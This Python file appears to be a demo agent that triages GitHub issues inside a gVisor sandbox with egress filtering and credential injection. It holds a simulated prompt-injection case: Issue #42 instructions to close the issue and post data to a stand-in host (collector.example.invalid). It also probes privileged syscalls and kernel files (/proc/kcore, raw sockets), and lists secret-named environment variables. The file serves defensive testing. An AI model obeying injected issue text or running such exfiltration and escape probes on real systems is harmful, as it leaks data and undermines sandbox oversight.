# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""The Secure Runtime: Autonomous GitHub Issue Triage & Reproducer Agent on Agent Substrate.

Demonstrates all four acts of 'The Secure Runtime' session using Gemini on Vertex AI
and Agent Substrate (`ateworker-gvisor` + Golden Snapshots + `atenet-egress` +
`k8s-credential-provider` + `intent-extproc`):

  - Act 1 (The Sandbox Boundary): Inspects the user-space gVisor kernel (`4.4.0`),
    non-root UID, dropped Linux capabilities, and confirms that privileged system
    calls and raw packet sockets are intercepted in user space without touching the
    host Linux kernel.
  - Act 2 (Solving the Cold-Start Tax): Restores an actor from the Golden Snapshot
    with `numpy`, `pandas`, `scipy`, `matplotlib`, and `httpx` already resident in
    memory (`~470 ms` restore, `0 ms` import tax) to reproduce Issue #19, then
    suspends the actor back to GCS during LLM think time.
  - Act 3 (Dynamic Intent Filtering & Out-of-Sandbox Credential Injection): Triages
    Issue #42 from the private demo GitHub repository. The `before_tool_callback`
    classifies the turn as `github_issue_read_only`, attaches a per-actor
    `EgressPolicy` for `api.github.com:443` with `replaceHeaders` token injection,
    and registers `GET`/`HEAD` on `/repos/<owner>/<repo>/*` in `intent-extproc`.
    When untrusted instructions inside Issue #42 attempt to close the issue (`POST`)
    or reach an unlisted domain, `atenet-egress` and `intent-extproc` block them
    while the sandbox environment holds zero credentials.
  - Act 4 (Audit Attribution & Clean Reset): Queries the actor-attributed audit
    trail (`ate.actor.ref`), revokes the compromised actor, and spawns a clean
    actor from the immutable Golden Snapshot tag.
"""

import json
import os
from typing import Any, Dict

from google.adk.agents import LlmAgent
from google.adk.tools.base_tool import BaseTool
from google.adk.tools.tool_context import ToolContext

from .extproc_client import IntentExtProcClient
from .intent import classify_tool_intent
from .substrate_client import SubstrateClient

_substrate = SubstrateClient()
_extproc = IntentExtProcClient()

DEFAULT_ACTOR_NAME = os.environ.get("SUBSTRATE_DEFAULT_ACTOR", "triage-actor-1")
GITHUB_REPO = os.environ.get("GITHUB_REPO", "demo-org/demo-repo")

SYSTEM_INSTRUCTION = f"""You are **The Secure Runtime Triage Agent**, an autonomous coding and GitHub issue triage engineer running on Google Kubernetes Engine (GKE) with **Gemini on Vertex AI** and **Agent Substrate**.

Every Python tool execution runs inside an isolated **Agent Substrate Actor** (`ateworker-gvisor` user-space kernel) restored from a **Golden Snapshot** (`scientific-python`) with `numpy`, `pandas`, `scipy`, `matplotlib`, and `httpx` pre-loaded in memory.

### Available Tools & How to Use Them Across the 4 Demo Acts
1. `inspect_sandbox_boundary(actor_name)`:
   - Use for **Act 1 (The Sandbox Boundary)**.
   - Queries `/info` inside the gVisor actor and verifies user-space syscall interception (`unshare`, `mount`, `AF_PACKET` raw sockets, `/proc/kcore`) and confirms zero credentials exist inside `os.environ`.
2. `run_python_in_actor(code, declared_purpose, actor_name, suspend_after)`:
   - Use for **Act 2 (Solving the Cold-Start Tax — Issue #19 Reproducer)**.
   - Executes scientific Python code (`numpy`, `pandas`, `scipy`) with `0 ms` library import overhead because the actor wakes from the Golden Snapshot, then suspends the actor back to GCS so the worker is freed while you reason.
3. `triage_github_issue_in_sandbox(issue_number, follow_issue_instructions, actor_name)`:
   - Use for **Act 3 (Dynamic Intent Filtering & Credential Injection — Issue #42)**.
   - Fetches `https://api.github.com/repos/{GITHUB_REPO}/issues/<issue_number>` from inside the actor without any `GITHUB_TOKEN` in the sandbox (`k8s-credential-provider` injects the `Authorization` header at `atenet-egress`).
   - If `follow_issue_instructions=True`, also tests what happens when untrusted instructions inside Issue #42 attempt to `POST` a comment / close the issue on `api.github.com` or send data to an unlisted host (`collector.example.invalid`), demonstrating L7 method/path enforcement (`403 Forbidden` from `intent-extproc`) and DNS/SNI default-deny.
4. `audit_and_reset_actor_to_golden(actor_name, new_actor_name)`:
   - Use for **Act 4 (Audit Attribution & Clean Reset from Golden Snapshot)**.
   - Retrieves the structured `ate.actor.ref` egress audit log from `intent-extproc`, revokes the actor's egress rules, deletes the tainted actor instance, and creates a fresh actor directly from the immutable `scientific-python` Golden Snapshot.

Always present clear Markdown summaries and tables showing the measured latencies, kernel/syscall verdicts, and L7 egress decisions."""


def _sync_intent_policy(
    tool_name: str, actor_name: str, declared_purpose: str = ""
) -> Dict[str, Any]:
    """Classifies tool intent and programs atenet-egress + intent-extproc."""
    actor_ref = f"{_substrate.atespace}/{actor_name}"
    classification = classify_tool_intent(
        tool_name=tool_name,
        declared_purpose=declared_purpose,
        github_repo=GITHUB_REPO,
    )
    _substrate.ensure_actor(actor_name)
    return {
        "intent_name": classification.intent_name,
        "rationale": classification.rationale,
        "egress_policy": _substrate.apply_egress_policy(actor_name, classification),
        "intent_extproc": _extproc.apply_intent(actor_ref, classification),
    }


def _before_tool_intent_gate(
    tool: BaseTool, args: Dict[str, Any], tool_context: ToolContext
) -> Dict[str, Any] | None:
    """ADK before_tool_callback: classifies intent and programs atenet-egress + intent-extproc."""
    tool_name = getattr(tool, "name", "")
    if tool_name in ("inspect_sandbox_boundary", "audit_and_reset_actor_to_golden"):
        return None
    actor_name = args.get("actor_name") or DEFAULT_ACTOR_NAME
    declared_purpose = args.get("declared_purpose", "")
    try:
        tool_context.state["last_intent_classification"] = _sync_intent_policy(
            tool_name, actor_name, declared_purpose
        )
    except Exception as exc:  # noqa: BLE001
        tool_context.state["last_intent_classification"] = {
            "warning": f"Control-plane policy sync note: {exc}",
        }
    return None


def inspect_sandbox_boundary(actor_name: str = DEFAULT_ACTOR_NAME) -> str:
    """Act 1: Inspects the gVisor security boundary, UID, capabilities, and syscall filtering.

    Args:
        actor_name: Name of the Agent Substrate actor to inspect.

    Returns:
        JSON string containing kernel version, UID/capabilities, credential env check,
        and results of attempting privileged operations inside the user-space kernel.
    """
    ensure_info = _substrate.ensure_actor(actor_name)
    sandbox_info = _substrate.call_actor(actor_name, "GET", "/info")

    boundary_probe_code = """
import ctypes, json, os, socket, subprocess

checks = {}
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
    s.close()
    checks["af_packet_raw_socket"] = "UNEXPECTED_ALLOWED"
except OSError as exc:
    checks["af_packet_raw_socket"] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"

libc = ctypes.CDLL(None, use_errno=True)
if libc.unshare(0x10000000 | 0x00020000) != 0:
    err = ctypes.get_errno()
    checks["unshare_user_mount_ns"] = f"BLOCKED_BY_GVISOR (errno={err}: {os.strerror(err)})"

for path in ("/proc/kcore", "/proc/kallsyms", "/proc/sysrq-trigger", "/sys/firmware"):
    try:
        with open(path, "rb") as fh:
            fh.read(16)
        checks[path] = "UNEXPECTED_ALLOWED"
    except OSError as exc:
        checks[path] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"

kmsg = subprocess.run(["dmesg"], capture_output=True, text=True)
checks["dmesg"] = f"BLOCKED_BY_GVISOR (exit={kmsg.returncode})" if kmsg.returncode != 0 else "UNEXPECTED_ALLOWED"
print(json.dumps(checks))
"""
    probe_run = _substrate.call_actor(
        actor_name, "POST", "/run", {"code": boundary_probe_code}
    )
    syscall_checks = {}
    if probe_run.get("stdout"):
        try:
            syscall_checks = json.loads(probe_run["stdout"].strip().splitlines()[-1])
        except json.JSONDecodeError:
            syscall_checks = {"raw_stdout": probe_run.get("stdout")}

    return json.dumps(
        {
            "act": "Act 1 — The Sandbox Boundary (User-Space Kernel Isolation)",
            "actor": ensure_info,
            "sandbox_identity": sandbox_info,
            "user_space_syscall_verdicts": syscall_checks,
        },
        indent=2,
    )


def run_python_in_actor(
    code: str,
    declared_purpose: str = "offline_scientific_reproducer",
    actor_name: str = DEFAULT_ACTOR_NAME,
    suspend_after: bool = True,
) -> str:
    """Act 2: Executes Python code inside a Golden-Snapshot-restored Actor and optionally suspends it."""
    policy_sync = _sync_intent_policy("run_python_in_actor", actor_name, declared_purpose)
    exec_result = _substrate.call_actor(actor_name, "POST", "/run", {"code": code})
    suspend_info = _substrate.suspend_actor(actor_name) if suspend_after else None

    return json.dumps(
        {
            "act": "Act 2 — Golden Snapshot Restore & Zero-Import-Tax Execution",
            "declared_purpose": declared_purpose,
            "policy_sync": policy_sync,
            "execution": exec_result,
            "suspended_to_gcs": suspend_info,
        },
        indent=2,
    )


def triage_github_issue_in_sandbox(
    issue_number: int = 42,
    follow_issue_instructions: bool = True,
    actor_name: str = DEFAULT_ACTOR_NAME,
) -> str:
    """Act 3: Fetches a GitHub issue via out-of-sandbox credential injection and tests L7 intent filtering."""
    actor_ref = f"{_substrate.atespace}/{actor_name}"
    policy_sync = _sync_intent_policy(
        "triage_github_issue_in_sandbox", actor_name, f"triage issue #{issue_number}"
    )
    triage_script = f"""
import json, os, httpx

repo = {json.dumps(GITHUB_REPO)}
issue_num = {int(issue_number)}
follow_untrusted = {bool(follow_issue_instructions)}
headers = {{"Accept": "application/vnd.github+json", "Authorization": "Bearer ate-injected-at-egress"}}
report = {{
    "sandbox_credential_env_vars": [
        k for k in os.environ if any(w in k.upper() for w in ("TOKEN", "SECRET", "GITHUB", "KEY"))
    ],
    "steps": {{}},
}}

with httpx.Client(timeout=15.0) as client:
    get_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}"
    r_get = client.get(get_url, headers=headers)
    if r_get.status_code == 404:
        get_url = f"https://api.github.com/repos/{{repo}}/issues?per_page=1"
        r_get = client.get(get_url, headers=headers)
    data = r_get.json() if r_get.headers.get("content-type", "").startswith("application/json") else {{}}
    item = data[0] if isinstance(data, list) and data else (data if isinstance(data, dict) else {{}})
    report["steps"]["1_fetch_issue_get"] = {{
        "method": "GET",
        "url": get_url,
        "status_code": r_get.status_code,
        "verdict": "ALLOWED_WITH_INJECTED_CREDENTIAL" if r_get.status_code == 200 else f"HTTP_{{r_get.status_code}}",
        "issue_title": item.get("title"),
    }}

    if follow_untrusted:
        post_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}/comments"
        r_post = client.post(post_url, headers=headers, json={{"body": "Automated triage status update"}})
        report["steps"]["2_attempt_post_comment"] = {{
            "method": "POST",
            "url": post_url,
            "status_code": r_post.status_code,
            "verdict": "BLOCKED_403_BY_INTENT_EXTPROC" if r_post.status_code == 403 else f"HTTP_{{r_post.status_code}}",
            "response": r_post.text[:200],
        }}

        unlisted_url = "https://collector.example.invalid/telemetry"
        try:
            r_ext = client.post(unlisted_url, json={{"ping": "diagnostic"}})
            report["steps"]["3_attempt_unlisted_host"] = {{"url": unlisted_url, "status_code": r_ext.status_code}}
        except Exception as exc:
            report["steps"]["3_attempt_unlisted_host"] = {{
                "url": unlisted_url,
                "verdict": "BLOCKED_BY_DEFAULT_DENY_EGRESS_GATEWAY",
                "error": str(exc),
            }}

print(json.dumps(report))
"""
    exec_res = _substrate.call_actor(
        actor_name, "POST", "/run", {"code": triage_script}
    )
    parsed_report: Dict[str, Any] = {}
    if exec_res.get("stdout"):
        try:
            parsed_report = json.loads(exec_res["stdout"].strip().splitlines()[-1])
        except json.JSONDecodeError:
            parsed_report = {"raw_stdout": exec_res.get("stdout")}

    return json.dumps(
        {
            "act": "Act 3 — Dynamic Intent Filtering & Out-of-Sandbox Credential Injection",
            "actor_ref": actor_ref,
            "policy_sync": policy_sync,
            "triage_execution": parsed_report,
            "intent_extproc_audit_trail": _extproc.list_audit_events(actor_ref)[-5:],
        },
        indent=2,
    )


def audit_and_reset_actor_to_golden(
    actor_name: str = DEFAULT_ACTOR_NAME,
    new_actor_name: str = "triage-actor-clean",
) -> str:
    """Act 4: Retrieves the actor-attributed audit trail, quarantines the actor, and resets from Golden Snapshot.

    Args:
        actor_name: Name of the actor that processed untrusted input.
        new_actor_name: Name of the fresh replacement actor restored from the Golden Snapshot.

    Returns:
        JSON string containing the audit trail, revocation status, and fresh Golden Snapshot actor info.
    """
    actor_ref = f"{_substrate.atespace}/{actor_name}"
    audit_events = _extproc.list_audit_events(actor_ref)

    # 1. Revoke L7 intent rules and delete per-actor EgressPolicy.
    revoke_extproc = _extproc.revoke_intent(actor_ref)
    revoke_egress = _substrate.apply_egress_policy(
        actor_name, classify_tool_intent("offline")
    )

    # 2. Delete the tainted actor so its ephemeral session state is discarded.
    delete_info = _substrate.delete_actor(actor_name)

    # 3. Spawn and wake a clean actor directly from the immutable Golden Snapshot tag.
    clean_actor_info = _substrate.ensure_actor(new_actor_name)
    clean_sandbox_check = _substrate.call_actor(new_actor_name, "GET", "/info")

    return json.dumps(
        {
            "act": "Act 4 — Actor-Attributed Audit Trail & Clean Reset from Golden Snapshot",
            "quarantined_actor": actor_ref,
            "audit_events_attributed_to_actor": audit_events,
            "policy_revocation": {
                "intent_extproc": revoke_extproc,
                "egress_policy": revoke_egress,
            },
            "deleted_tainted_actor": delete_info,
            "restored_clean_actor_from_golden_snapshot": {
                "actor": clean_actor_info,
                "sandbox_info": clean_sandbox_check,
            },
        },
        indent=2,
    )


model_name = os.environ.get("GEMINI_MODEL", "gemini-2.5-flash")

root_agent = LlmAgent(
    name="Secure_Runtime_Triage_Agent",
    model=model_name,
    description=(
        "Autonomous GitHub issue triage and scientific reproducer agent running on "
        "GKE Agent Substrate with user-space gVisor isolation, Golden Snapshots, "
        "out-of-sandbox credential injection, and dynamic L7 intent filtering."
    ),
    instruction=SYSTEM_INSTRUCTION,
    before_tool_callback=_before_tool_intent_gate,
    tools=[
        inspect_sandbox_boundary,
        run_python_in_actor,
        triage_github_issue_in_sandbox,
        audit_and_reset_actor_to_golden,
    ],
)
